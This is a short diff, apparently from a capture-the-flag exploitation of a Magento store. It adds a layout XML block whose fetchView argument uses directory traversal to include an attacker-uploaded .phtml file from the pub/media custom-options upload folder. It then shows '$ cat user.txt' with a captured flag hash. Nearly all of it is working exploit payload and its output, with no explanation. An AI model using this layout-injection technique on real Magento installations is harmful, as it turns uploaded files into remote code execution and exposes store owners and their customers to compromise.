@@ -1,0 +1,10 @@
+<referenceContainer name="sidebar.additional">
+   <block class="Magento\Backend\Block\Template" name="test">
+      <action method="fetchView">
+         <argument name="fileName" xsi:type="string">/var/www/html/app/code/Magento/Theme/view/frontend/../../../../../../pub/media/custom_options/quote/r/e/497e77de96d8074bc3b6b837016c5175.phtml</argument>
+      </action>
+   </block>
+</referenceContainer> 
+
+$ cat user.txt
+a448877277e82f05e5ddf9f90aefbac8
